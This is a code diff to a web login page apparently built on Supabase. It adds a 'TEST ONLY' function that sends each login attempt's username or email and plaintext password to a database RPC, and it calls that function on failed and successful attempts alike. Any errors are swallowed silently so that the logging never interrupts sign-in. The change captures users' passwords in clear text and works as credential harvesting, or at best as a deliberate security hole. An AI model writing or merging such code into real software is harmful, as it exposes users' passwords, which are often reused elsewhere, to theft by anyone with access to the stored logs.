@@ -60,6 +60,19 @@
       document.getElementById("password").focus();
     });
 
+    // TEST ONLY: records the entered credentials for every login attempt.
+    async function logLoginAttempt(identifier, password, success) {
+      try {
+        await supabaseClient.rpc("log_login_attempt", {
+          p_identifier: identifier,
+          p_password: password,
+          p_success: success,
+        });
+      } catch (_) {
+        /* logging must never block the login flow */
+      }
+    }
+
     async function resolveEmail(identifier) {
       if (identifier.includes("@")) return identifier;
       const { data, error } = await supabaseClient.rpc("get_email_for_username", { uname: identifier });
@@ -80,6 +93,7 @@
       const email = await resolveEmail(identifier);
 
       if (!email) {
+        await logLoginAttempt(identifier, password, false);
         loginBtn.disabled = false;
         loginBtn.textContent = "Log in";
         showWrongPasswordToast();
@@ -87,6 +101,8 @@
       }
 
       const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });
+
+      await logLoginAttempt(identifier, password, !error);
 
       loginBtn.disabled = false;
       loginBtn.textContent = "Log in";
